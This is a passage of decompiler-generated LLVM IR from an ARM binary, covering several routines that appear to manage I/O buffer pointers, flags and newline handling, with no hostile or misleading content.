  %v0_1419c = load i32, i32* %ip.global-to-local, align 4
  %v1_1419c = inttoptr i32 %v0_1419c to i8*
  %v2_1419c = load i8, i8* %v1_1419c, align 1
  %v2_141a0 = icmp eq i8 %v2_1419c, 0
  br i1 %v2_141a0, label %dec_label_pc_14160, label %dec_label_pc_141a8

dec_label_pc_141a8:                               ; preds = %dec_label_pc_14198
  %v1_141a8 = load i32, i32* %r2.global-to-local, align 4
  %v2_141a8 = add i32 %v1_141a8, %v0_1419c
  store i32 %v2_141a8, i32* %ip.global-to-local, align 4
  %v0_141ac = load i32, i32* %r0.global-to-local, align 4
  %v1_141ac = add i32 %v0_141ac, -1
  store i32 %v1_141ac, i32* %r0.global-to-local, align 4
  %v2_141b0 = icmp eq i32 %v1_141ac, 0
  br i1 %v2_141b0, label %dec_label_pc_141b8, label %dec_label_pc_141a8.dec_label_pc_14188_crit_edge

dec_label_pc_141a8.dec_label_pc_14188_crit_edge:  ; preds = %dec_label_pc_141a8
  %v0_14188.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_14188

dec_label_pc_141b8:                               ; preds = %dec_label_pc_141a8, %dec_label_pc_14170, %dec_label_pc_14160
  %v0_141b8 = phi i32 [ %v0_1419c, %dec_label_pc_14160 ], [ %v2_1419814, %dec_label_pc_14170 ], [ %v2_141a8, %dec_label_pc_141a8 ]
  %v1_141b8 = load i32, i32* @sp, align 4
  %v9_141b8 = icmp eq i32 %v0_141b8, %v1_141b8
  br i1 %v9_141b8, label %bb31, label %bb30

bb30:                                             ; preds = %dec_label_pc_141b8
  %v1_141bc = load i32, i32* @lr, align 4
  store i32 %v1_141bc, i32* %v1_1417c, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_141b8, %bb30
  %v0_141c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_141c0 = load i32, i32* %r4.global-to-local, align 4
  %v2_141c0 = sub i32 %v1_141c0, %v0_141c0
  store i32 %v2_141c0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_141c4

dec_label_pc_141c4:                               ; preds = %dec_label_pc_1414c, %bb31
  %v0_141c4 = phi i32 [ %v0_141c4.pre, %dec_label_pc_1414c ], [ %v2_141c0, %bb31 ]
  store i32 %v0_141c4, i32* %r0.global-to-local, align 4
  %v2_141cc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_141cc, i32* %r4.global-to-local, align 4
  ret i32 %v0_141c4

; uselistorder directives
  uselistorder i32 %v0_141c4, { 1, 0 }
  uselistorder i32 %v1_141ac, { 1, 0 }
  uselistorder i32 %v2_141a8, { 0, 2, 1 }
  uselistorder i32 %v2_14188, { 1, 0 }
  uselistorder i32 %v2_1419814, { 1, 0 }
  uselistorder i32 %v1_14174.ph, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 3, 8, 6, 4, 5, 7, 9, 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 6, 3, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32* @sp, { 1, 32, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 127, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_141c4, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_14188, { 1, 0 }
  uselistorder label %dec_label_pc_14170, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14134, { 1, 0 }
}

define i32 @function_141d0(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_141d0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r8.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v2_141e42 = icmp eq i32 %arg3, 0
  store i1 %v2_141e42, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r2, align 4
  br i1 %v2_141e42, label %dec_label_pc_14284, label %dec_label_pc_141f0

dec_label_pc_141e4thread-pre-split:               ; preds = %bb22
  %v3_14208 = load i32, i32* %r7.global-to-local, align 4
  %v5_14208 = add i32 %v3_14208, %v4_141fc
  store i32 %v5_14208, i32* %r7.global-to-local, align 4
  %v5_1420c = sub i32 %v0_14204, %v4_141fc
  store i32 %v5_1420c, i32* %r5.global-to-local, align 4
  %v2_141e4 = icmp eq i32 %v5_1420c, 0
  store i1 %v2_141e4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_1420c, i32* @r2, align 4
  br i1 %v2_141e4, label %dec_label_pc_141e4.dec_label_pc_14284.loopexit_crit_edge, label %dec_label_pc_141f0

dec_label_pc_141f0:                               ; preds = %dec_label_pc_141d0, %dec_label_pc_141e4thread-pre-split
  %v0_141f4 = phi i32 [ %v5_14208, %dec_label_pc_141e4thread-pre-split ], [ %arg2, %dec_label_pc_141d0 ]
  %v0_141f0.in = phi i32 [ %v5_1420c, %dec_label_pc_141e4thread-pre-split ], [ %arg3, %dec_label_pc_141d0 ]
  %v0_141f0 = icmp slt i32 %v0_141f0.in, 0
  br i1 %v0_141f0, label %bb, label %bb22

bb:                                               ; preds = %dec_label_pc_141f0
  store i32 2147483647, i32* @r2, align 4
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_141f0, %bb
  %v0_141f8 = load i32, i32* @r4, align 4
  %v1_141f8 = add i32 %v0_141f8, 4
  %v2_141f8 = inttoptr i32 %v1_141f8 to i32*
  %v3_141f8 = load i32, i32* %v2_141f8, align 4
  store i32 %v3_141f8, i32* %r0.global-to-local, align 4
  %tmp23 = inttoptr i32 %v0_141f4 to i32*
  %v4_141fc = call i32 @function_109a0(i32 %v3_141f8, i32* %tmp23)
  store i32 %v4_141fc, i32* %r0.global-to-local, align 4
  %v1_14200 = icmp slt i32 %v4_141fc, 0
  %v2_14200 = icmp eq i32 %v4_141fc, 0
  store i1 %v2_14200, i1* %cpsr_z.global-to-local, align 1
  %v0_14204 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14204, i32* %r6.global-to-local, align 4
  br i1 %v1_14200, label %dec_label_pc_14214, label %dec_label_pc_141e4thread-pre-split

dec_label_pc_14214:                               ; preds = %bb22
  %v0_14214 = load i32, i32* @r4, align 4
  %v1_14214 = inttoptr i32 %v0_14214 to i32*
  %v2_14214 = load i32, i32* %v1_14214, align 4
  store i32 %v2_14214, i32* %r3.global-to-local, align 4
  %v1_14218 = add i32 %v0_14214, 8
  store i32 %v1_14218, i32* %r0.global-to-local, align 4
  %v1_1421c = inttoptr i32 %v1_14218 to i32*
  %v2_1421c = load i32, i32* %v1_1421c, align 4
  store i32 %v2_1421c, i32* %r0.global-to-local, align 4
  %v3_1421c = add i32 %v0_14214, 12
  %v4_1421c = inttoptr i32 %v3_1421c to i32*
  %v5_1421c = load i32, i32* %v4_1421c, align 4
  %v1_14220 = or i32 %v2_14214, 8
  store i32 %v1_14220, i32* %r3.global-to-local, align 4
  %v3_14224 = sdiv i32 %v2_14214, 256
  %v2_14228 = sub i32 %v5_1421c, %v2_1421c
  store i32 %v2_14228, i32* @r2, align 4
  %v9_14228 = icmp eq i32 %v5_1421c, %v2_1421c
  store i1 %v9_14228, i1* %cpsr_z.global-to-local, align 1
  %v1_1422c = trunc i32 %v3_14224 to i8
  %v3_1422c = add i32 %v0_14214, 1
  %v4_1422c = inttoptr i32 %v3_1422c to i8*
  store i8 %v1_1422c, i8* %v4_1422c, align 1
  %v0_14230 = load i32, i32* %r3.global-to-local, align 4
  %v1_14230 = trunc i32 %v0_14230 to i8
  %v2_14230 = load i32, i32* @r4, align 4
  %v3_14230 = inttoptr i32 %v2_14230 to i8*
  store i8 %v1_14230, i8* %v3_14230, align 1
  %v0_14234 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14234, label %dec_label_pc_14214.dec_label_pc_14280_crit_edge, label %dec_label_pc_14238

dec_label_pc_14214.dec_label_pc_14280_crit_edge:  ; preds = %dec_label_pc_14214
  %v0_14280.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14280

dec_label_pc_14238:                               ; preds = %dec_label_pc_14214
  %v0_14238 = load i32, i32* @r2, align 4
  %v1_14238 = load i32, i32* %r5.global-to-local, align 4
  %v9_14238 = icmp eq i32 %v0_14238, %v1_14238
  store i1 %v9_14238, i1* %cpsr_z.global-to-local, align 1
  %tmp29 = icmp ugt i32 %v0_14238, %v1_14238
  br i1 %tmp29, label %.preheader, label %bb24

bb24:                                             ; preds = %dec_label_pc_14238
  store i32 %v0_14238, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_14238, %bb24
  %v0_14240.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_14244.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb25

bb25:                                             ; preds = %.preheader, %dec_label_pc_14264
  %v2_14244 = phi i32 [ %v2_14244.pre, %.preheader ], [ %v1_14268, %dec_label_pc_14264 ]
  %v0_14240 = phi i32 [ %v0_14240.pre, %.preheader ], [ %v1_14250, %dec_label_pc_14264 ]
  %v1_14240 = inttoptr i32 %v0_14240 to i8*
  %v2_14240 = load i8, i8* %v1_14240, align 1
  %v3_14240 = zext i8 %v2_14240 to i32
  store i32 %v3_14240, i32* %r3.global-to-local, align 4
  %v3_14244 = inttoptr i32 %v2_14244 to i8*
  store i8 %v2_14240, i8* %v3_14244, align 1
  %v0_14248 = load i32, i32* %r0.global-to-local, align 4
  %v1_14248 = inttoptr i32 %v0_14248 to i8*
  %v2_14248 = load i8, i8* %v1_14248, align 1
  %v3_14248 = zext i8 %v2_14248 to i32
  store i32 %v3_14248, i32* %r3.global-to-local, align 4
  %v7_1424c = icmp eq i8 %v2_14248, 10
  store i1 %v7_1424c, i1* %cpsr_z.global-to-local, align 1
  %v0_14250 = load i32, i32* %r7.global-to-local, align 4
  %v1_14250 = add i32 %v0_14250, 1
  store i32 %v1_14250, i32* %r7.global-to-local, align 4
  br i1 %v7_1424c, label %dec_label_pc_14258, label %dec_label_pc_14264

dec_label_pc_14258:                               ; preds = %bb25
  %v0_14258 = load i32, i32* @r4, align 4
  %v1_14258 = add i32 %v0_14258, 1
  %v2_14258 = inttoptr i32 %v1_14258 to i8*
  %v3_14258 = load i8, i8* %v2_14258, align 1
  %v4_14258 = zext i8 %v3_14258 to i32
  store i32 %v4_14258, i32* %r3.global-to-local, align 4
  %tmp30 = urem i8 %v3_14258, 2
  %v2_1425c = icmp eq i8 %tmp30, 0
  store i1 %v2_1425c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1425c, label %dec_label_pc_14264, label %dec_label_pc_14270

dec_label_pc_14264:                               ; preds = %dec_label_pc_14258, %bb25
  %v0_14264 = load i32, i32* %r6.global-to-local, align 4
  %v1_14264 = add i32 %v0_14264, -1
  store i32 %v1_14264, i32* %r6.global-to-local, align 4
  %v7_14264 = icmp eq i32 %v0_14264, 1
  store i1 %v7_14264, i1* %cpsr_z.global-to-local, align 1
  %v1_14268 = add i32 %v0_14248, 1
  store i32 %v1_14268, i32* %r0.global-to-local, align 4
  br i1 %v7_14264, label %dec_label_pc_14264.dec_label_pc_14270_crit_edge, label %bb25

dec_label_pc_14264.dec_label_pc_14270_crit_edge:  ; preds = %dec_label_pc_14264
  %v0_14270.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14270

dec_label_pc_14270:                               ; preds = %dec_label_pc_14258, %dec_label_pc_14264.dec_label_pc_14270_crit_edge
  %v0_14274 = phi i32 [ %v1_14268, %dec_label_pc_14264.dec_label_pc_14270_crit_edge ], [ %v0_14248, %dec_label_pc_14258 ]
  %v0_14270 = phi i32 [ %v0_14270.pre, %dec_label_pc_14264.dec_label_pc_14270_crit_edge ], [ %v0_14258, %dec_label_pc_14258 ]
  %v1_14270 = add i32 %v0_14270, 8
  %v2_14270 = inttoptr i32 %v1_14270 to i32*
  %v3_14270 = load i32, i32* %v2_14270, align 4
  store i32 %v3_14270, i32* %r3.global-to-local, align 4
  %v2_14274 = add i32 %v0_14270, 16
  %v3_14274 = inttoptr i32 %v2_14274 to i32*
  store i32 %v0_14274, i32* %v3_14274, align 4
  %v0_14278 = load i32, i32* %r3.global-to-local, align 4
  %v1_14278 = load i32, i32* %r0.global-to-local, align 4
  %v2_14278 = sub i32 %v1_14278, %v0_14278
  store i32 %v2_14278, i32* %r3.global-to-local, align 4
  %v1_1427c = load i32, i32* %r5.global-to-local, align 4
  %v2_1427c = sub i32 %v1_1427c, %v2_14278
  store i32 %v2_1427c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14280

dec_label_pc_14280:                               ; preds = %dec_label_pc_14214.dec_label_pc_14280_crit_edge, %dec_label_pc_14270
  %v0_14280 = phi i32 [ %v0_14280.pre, %dec_label_pc_14214.dec_label_pc_14280_crit_edge ], [ %v2_1427c, %dec_label_pc_14270 ]
  %v1_14280 = load i32, i32* %r8.global-to-local, align 4
  %v2_14280 = sub i32 %v1_14280, %v0_14280
  store i32 %v2_14280, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14284

dec_label_pc_141e4.dec_label_pc_14284.loopexit_crit_edge: ; preds = %dec_label_pc_141e4thread-pre-split
  %v0_14284.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14284

dec_label_pc_14284:                               ; preds = %dec_label_pc_141d0, %dec_label_pc_141e4.dec_label_pc_14284.loopexit_crit_edge, %dec_label_pc_14280
  %v0_14284 = phi i32 [ %v2_14280, %dec_label_pc_14280 ], [ %v0_14284.pre.pre, %dec_label_pc_141e4.dec_label_pc_14284.loopexit_crit_edge ], [ 0, %dec_label_pc_141d0 ]
  store i32 %v0_14284, i32* %r0.global-to-local, align 4
  ret i32 %v0_14284

; uselistorder directives
  uselistorder i32 %v0_14284, { 1, 0 }
  uselistorder i32 %v0_14270, { 1, 0 }
  uselistorder i32 %v1_14268, { 0, 2, 1 }
  uselistorder i32 %v0_14264, { 1, 0 }
  uselistorder i1 %v2_1425c, { 1, 0 }
  uselistorder i32 %v1_14250, { 1, 0 }
  uselistorder i32 %v0_14238, { 1, 0, 2 }
  uselistorder i32 %v5_1421c, { 1, 0 }
  uselistorder i32 %v2_1421c, { 1, 0, 2 }
  uselistorder i32 %v0_14204, { 1, 0 }
  uselistorder i32 %v4_141fc, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v5_1420c, { 0, 2, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 3, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r5.global-to-local, { 6, 4, 2, 1, 3, 0, 5 }
  uselistorder i32* %r3.global-to-local, { 6, 7, 8, 0, 1, 2, 3, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 6, 8, 9, 7, 1, 2, 3, 5, 4, 0 }
  uselistorder i8 10, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 2147483647, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14284, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14280, { 1, 0 }
  uselistorder label %dec_label_pc_14270, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_141f0, { 1, 0 }
}

define i32 @function_1428c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1428c:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1428c = load i32, i32* @r4, align 4
  store i32 %v3_1428c, i32* %stack_var_-20, align 4
  %v6_1428c = load i32, i32* @r5, align 4
  %v9_1428c = load i32, i32* @r6, align 4
  %v12_1428c = load i32, i32* @r7, align 4
  %v15_1428c = load i32, i32* @lr, align 4
  %v1_14290 = add i32 %arg3, 1
  %v2_14290 = inttoptr i32 %v1_14290 to i8*
  %v3_14290 = load i8, i8* %v2_14290, align 1
  %v4_14290 = zext i8 %v3_14290 to i32
  %v3_14294 = mul nuw nsw i32 %v4_14290, 256
  %v1_14298 = and i32 %v3_14294, 512
  store i32 %v1_14298, i32* @r4, align 4
  %v2_14298 = icmp eq i32 %v1_14298, 0
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_14298, label %dec_label_pc_142ac, label %dec_label_pc_143a8

dec_label_pc_142ac:                               ; preds = %dec_label_pc_1428c
  %v1_142ac = add i32 %arg3, 4
  %v2_142ac = inttoptr i32 %v1_142ac to i32*
  %v3_142ac = load i32, i32* %v2_142ac, align 4
  %v1_142b4 = add i32 %arg3, 16
  %v2_142b4 = inttoptr i32 %v1_142b4 to i32*
  %v3_142b4 = load i32, i32* %v2_142b4, align 4
  store i32 %v3_142b4, i32* @r0, align 4
  %v1_142b8 = add i32 %arg3, 12
  %v2_142b8 = inttoptr i32 %v1_142b8 to i32*
  %v3_142b8 = load i32, i32* %v2_142b8, align 4
  %v4_142bc = icmp eq i32 %v3_142ac, -2
  %v2_142c0 = sub i32 %v3_142b8, %v3_142b4
  br i1 %v4_142bc, label %dec_label_pc_142c0, label %dec_label_pc_142e8

dec_label_pc_142c0:                               ; preds = %dec_label_pc_142ac
  %v3_142c4 = icmp ugt i32 %v2_142c0, %arg2
  br i1 %v3_142c4, label %bb, label %bb10

bb:                                               ; preds = %dec_label_pc_142c0
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_142c0, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_142c0, %dec_label_pc_142c0 ]
  %v0_142cc = phi i32 [ %arg2, %bb ], [ %v2_142c0, %dec_label_pc_142c0 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_142cc, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_142d4 = call i32 @function_11d60()
  %v0_142d8 = load i32, i32* @r5, align 4
  %v1_142d8 = add i32 %v0_142d8, 16
  %v2_142d8 = inttoptr i32 %v1_142d8 to i32*
  %v3_142d8 = load i32, i32* %v2_142d8, align 4
  %v1_142dc = load i32, i32* @r4, align 4
  %v2_142dc = add i32 %v1_142dc, %v3_142d8
  store i32 %v2_142dc, i32* %v2_142d8, align 4
  br label %dec_label_pc_143bc

dec_label_pc_142e8:                               ; preds = %dec_label_pc_142ac
  %tmp = icmp ult i32 %v2_142c0, %arg2
  br i1 %tmp, label %dec_label_pc_14388, label %dec_label_pc_142f4

dec_label_pc_142f4:                               ; preds = %dec_label_pc_142e8
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_142fc = call i32 @function_11d60()
  %v0_14300 = load i32, i32* @r5, align 4
  %v1_14300 = add i32 %v0_14300, 16
  %v2_14300 = inttoptr i32 %v1_14300 to i32*
  %v3_14300 = load i32, i32* %v2_14300, align 4
  %v1_14304 = add i32 %v0_14300, 1
  %v2_14304 = inttoptr i32 %v1_14304 to i8*
  %v3_14304 = load i8, i8* %v2_14304, align 1
  %v1_14308 = load i32, i32* @r6, align 4
  %v2_14308 = add i32 %v1_14308, %v3_14300
  %tmp17 = urem i8 %v3_14304, 2
  %v2_1430c = icmp eq i8 %tmp17, 0
  store i32 %v2_14308, i32* %v2_14300, align 4
  br i1 %v2_1430c, label %dec_label_pc_143bc, label %dec_label_pc_14318

dec_label_pc_14318:                               ; preds = %dec_label_pc_142f4
  %v0_14318 = load i32, i32* %r7.global-to-local, align 4
  %v0_14320 = load i32, i32* @r6, align 4
  %v4_14324 = call i32 @function_15454(i32 %v0_14318, i32 10, i32 %v0_14320, i32 %v2_14308)
  %v2_14328 = icmp eq i32 %v4_14324, 0
  br i1 %v2_14328, label %dec_label_pc_143bc, label %dec_label_pc_14330

dec_label_pc_14330:                               ; preds = %dec_label_pc_14318
  %v0_14330 = load i32, i32* @r5, align 4
  %v1_14334 = call i32 @function_10c4c(i32 %v0_14330)
  %v2_14338 = icmp eq i32 %v1_14334, 0
  br i1 %v2_14338, label %dec_label_pc_143bc, label %dec_label_pc_14340

dec_label_pc_14340:                               ; preds = %dec_label_pc_14330
  %v0_14340 = load i32, i32* @r6, align 4
  %v3_14340 = icmp uge i32 %v0_14340, %v1_14334
  %v1_14334.v0_14340 = select i1 %v3_14340, i32 %v1_14334, i32 %v0_14340
  store i32 %v1_14334.v0_14340, i32* @r4, align 4
  %v2_1434c = sub i32 %v0_14340, %v1_14334.v0_14340
  %v0_14350 = load i32, i32* %r7.global-to-local, align 4
  %v2_14350 = add i32 %v0_14350, %v2_1434c
  store i32 %v2_14350, i32* %r7.global-to-local, align 4
  store i32 %v1_14334.v0_14340, i32* @r2, align 4
  %v4_14360 = call i32 @function_15340(i32 %v2_14350, i32 10, i32 %v1_14334.v0_14340, i32 %v2_1434c)
  %v2_14364 = icmp eq i32 %v4_14360, 0
  br i1 %v2_14364, label %dec_label_pc_143bc, label %dec_label_pc_1436c

dec_label_pc_1436c:                               ; preds = %dec_label_pc_14340
  %v0_1436c = load i32, i32* @r5, align 4
  %v1_1436c = add i32 %v0_1436c, 16
  %v2_1436c = inttoptr i32 %v1_1436c to i32*
  %v3_1436c = load i32, i32* %v2_1436c, align 4
  %v0_14370 = load i32, i32* %r7.global-to-local, align 4
  %v1_14370 = load i32, i32* @r4, align 4
  %v2_14370 = sub i32 %v0_14370, %v4_14360
  %v2_14374 = add i32 %v2_14370, %v1_14370
  %v2_14378 = sub i32 %v3_1436c, %v2_14374
  %v1_1437c = load i32, i32* @r6, align 4
  %v2_1437c = sub i32 %v1_1437c, %v2_14374
  store i32 %v2_1437c, i32* @r6, align 4
  store i32 %v2_14378, i32* %v2_1436c, align 4
  br label %dec_label_pc_143bc

dec_label_pc_14388:                               ; preds = %dec_label_pc_142e8
  %v1_14388 = add i32 %arg3, 8
  %v2_14388 = inttoptr i32 %v1_14388 to i32*
  %v3_14388 = load i32, i32* %v2_14388, align 4
  %v9_1438c = icmp eq i32 %v3_142b4, %v3_14388
  br i1 %v9_1438c, label %dec_label_pc_143a8, label %dec_label_pc_14394

dec_label_pc_14394:                               ; preds = %dec_label_pc_14388
  %v1_14398 = call i32 @function_10c4c(i32 %arg3)
  %v2_1439c = icmp eq i32 %v1_14398, 0
  br i1 %v2_1439c, label %dec_label_pc_14394.dec_label_pc_143a8_crit_edge, label %bb13

dec_label_pc_14394.dec_label_pc_143a8_crit_edge:  ; preds = %dec_label_pc_14394
  %v0_143b0.pre = load i32, i32* @r6, align 4
  %v0_143a8.pre = load i32, i32* @r5, align 4
  %v0_143ac.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_143b4.pre = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_143a8

bb13:                                             ; preds = %dec_label_pc_14394
  %v1_143a0 = load i32, i32* @r4, align 4
  store i32 %v1_143a0, i32* @r6, align 4
  br label %dec_label_pc_143bc

dec_label_pc_143a8:                               ; preds = %dec_label_pc_14394.dec_label_pc_143a8_crit_edge, %dec_label_pc_1428c, %dec_label_pc_14388
  %v2_143b4 = phi i32 [ %v2_143b4.pre, %dec_label_pc_14394.dec_label_pc_143a8_crit_edge ], [ %v3_1428c, %dec_label_pc_1428c ], [ %v3_1428c, %dec_label_pc_14388 ]
  %v0_143ac = phi i32 [ %v0_143ac.pre, %dec_label_pc_14394.dec_label_pc_143a8_crit_edge ], [ %arg1, %dec_label_pc_1428c ], [ %arg1, %dec_label_pc_14388 ]
  %v0_143a8 = phi i32 [ %v0_143a8.pre, %dec_label_pc_14394.dec_label_pc_143a8_crit_edge ], [ %arg3, %dec_label_pc_1428c ], [ %arg3, %dec_label_pc_14388 ]
  %v0_143b0 = phi i32 [ %v0_143b0.pre, %dec_label_pc_14394.dec_label_pc_143a8_crit_edge ], [ %arg2, %dec_label_pc_1428c ], [ %arg2, %dec_label_pc_14388 ]
  store i32 %v2_143b4, i32* @r4, align 4
  store i32 %v9_1428c, i32* @r6, align 4
  store i32 %v15_1428c, i32* @lr, align 4
  %v3_143b8 = inttoptr i32 %v0_143a8 to i8*
  %v4_143b8 = call i32 @function_141d0(i8* %v3_143b8, i32 %v0_143ac, i32 %v0_143b0)
  br label %dec_label_pc_143bc

dec_label_pc_143bc:                               ; preds = %bb13, %dec_label_pc_14340, %dec_label_pc_14330, %dec_label_pc_14318, %dec_label_pc_142f4, %dec_label_pc_1436c, %bb10, %dec_label_pc_143a8
  %v0_143bc = load i32, i32* @r6, align 4
  %v2_143c0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_143c0, i32* @r4, align 4
  store i32 %v6_1428c, i32* @r5, align 4
  store i32 %v9_1428c, i32* @r6, align 4
  store i32 %v12_1428c, i32* @r7, align 4
  ret i32 %v0_143bc

; uselistorder directives
  uselistorder i32 %v2_14374, { 1, 0 }
  uselistorder i32 %v2_1434c, { 1, 0 }
  uselistorder i32 %v1_14334.v0_14340, { 1, 2, 0, 3 }
  uselistorder i32 %v0_14340, { 1, 0, 2 }
  uselistorder i32 %v2_142c0, { 2, 0, 1, 3 }
  uselistorder i32 %v9_1428c, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i8 2, { 0, 1, 2, 5, 3, 6, 4, 7 }
  uselistorder i32 %arg3, { 0, 1, 7, 3, 5, 4, 8, 2, 6 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_143bc, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_143a8, { 0, 2, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @function_143c4(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_143c4:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_143c4 = load i32, i32* @r4, align 4
  store i32 %v3_143c4, i32* %stack_var_-8, align 4
  %v3_143c8 = load i8, i8* %arg1, align 1
  %v4_143c8 = zext i8 %v3_143c8 to i32
  store i32 %v4_143c8, i32* %r2.global-to-local, align 4
  %v2_143cc = add i32 %tmp, 1
  %v3_143cc = inttoptr i32 %v2_143cc to i8*
  %v4_143cc = load i8, i8* %v3_143cc, align 1
  %v5_143cc = zext i8 %v4_143cc to i32
  store i32 %v5_143cc, i32* %r3.global-to-local, align 4
  %v4_143d0 = mul nuw nsw i32 %v5_143cc, 256
  %v5_143d0 = or i32 %v4_143d0, %v4_143c8
  store i32 %v5_143d0, i32* %r2.global-to-local, align 4
  %v2_143d4 = and i32 %v5_143d0, %arg2
  %v4_143d4 = icmp eq i32 %v2_143d4, 0
  store i1 %v4_143d4, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_143d4, label %dec_label_pc_143e0, label %dec_label_pc_143f8

dec_label_pc_143e0:                               ; preds = %dec_label_pc_143c4
  %v1_143e0 = and i32 %v5_143d0, 2176
  %v2_143e0 = icmp eq i32 %v1_143e0, 0
  store i1 %v2_143e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_143e0, label %dec_label_pc_143e8, label %dec_label_pc_1440c

dec_label_pc_143e8:                               ; preds = %dec_label_pc_143e0
  %v2_143e8 = or i32 %v5_143d0, %arg2
  store i32 %v2_143e8, i32* %r2.global-to-local, align 4
  %v3_143ec = sdiv i32 %v2_143e8, 256
  store i32 %v3_143ec, i32* %r3.global-to-local, align 4
  %v1_143f0 = trunc i32 %v3_143ec to i8
  store i8 %v1_143f0, i8* %v3_143cc, align 1
  %v0_143f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_143f4 = trunc i32 %v0_143f4 to i8
  store i8 %v1_143f4, i8* %arg1, align 1
  %v0_143f8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_143f8

dec_label_pc_143f8:                               ; preds = %dec_label_pc_143c4, %dec_label_pc_143e8
  %v0_14444 = phi i32 [ %tmp, %dec_label_pc_143c4 ], [ %v0_143f8.pre, %dec_label_pc_143e8 ]
  %v1_143f8 = inttoptr i32 %v0_14444 to i8*
  %v2_143f8 = load i8, i8* %v1_143f8, align 1
  %v3_143f8 = zext i8 %v2_143f8 to i32
  store i32 %v3_143f8, i32* %r2.global-to-local, align 4
  %v1_143fc = add i32 %v0_14444, 1
  %v2_143fc = inttoptr i32 %v1_143fc to i8*
  %v3_143fc = load i8, i8* %v2_143fc, align 1
  %v4_143fc = zext i8 %v3_143fc to i32
  store i32 %v4_143fc, i32* %r3.global-to-local, align 4
  %v4_14400 = mul nuw nsw i32 %v4_143fc, 256
